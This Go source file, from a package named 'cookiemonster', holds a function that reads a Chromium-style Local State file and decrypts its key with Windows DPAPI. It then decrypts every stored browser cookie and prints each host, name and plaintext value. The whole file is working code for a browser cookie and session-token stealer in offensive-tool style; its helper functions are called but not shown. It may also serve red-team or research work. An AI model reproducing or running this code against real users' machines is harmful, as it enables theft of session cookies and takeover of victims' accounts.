package cookiemonster

import (
	"fmt"
	"log"
)

func PrintCookies(stateFile, cookiesFile string) (string, error) {

	encryptedKey, err := ParseLocalState(stateFile)
	if err != nil {
		log.Printf("[-] Error parsing local state file: %v\n", err)
		return "", err
	}

	key, err := DecryptDPAPI(encryptedKey)
	if err != nil {
		log.Printf("[-] Error decrypting DPAPI blob of local state encrypted key: %v\n", err)
		return "", err
	}

	cookies, err := ParseCookies(cookiesFile)
	if err != nil {
		return "", err
	}

	log.Printf("[+] Found %d cookies\n", len(cookies))

	var output string
	for _, cookie := range cookies {

		// Decrypt the cookie value
		decrypted, err := DecryptEncryptedCookieValue([]byte(cookie.Value), key)
		if err != nil {
			log.Printf("[-] Error decrypting cookie value: %v\n", err)
			continue
		}

		output += fmt.Sprintf("[+] Host: %s\n", cookie.Host)
		output += fmt.Sprintf("    Name: %s\n", cookie.Name)
		output += fmt.Sprintf("    Value: %s\n", decrypted)
		output += fmt.Sprintf("    Path: %s\n", cookie.Path)
		output += fmt.Sprintf("    IsSecure: %t\n", cookie.IsSecure)
		output += fmt.Sprintf("    IsHttpOnly: %t\n", cookie.IsHttpOnly)
		output += fmt.Sprintf("    CreationUtc: %d\n", cookie.CreationUtc)
		output += fmt.Sprintf("    ExpiryUtc: %d\n", cookie.ExpiryUtc)
		output += fmt.Sprintln("--------------------------------------------------")
	}

	return output, nil
}
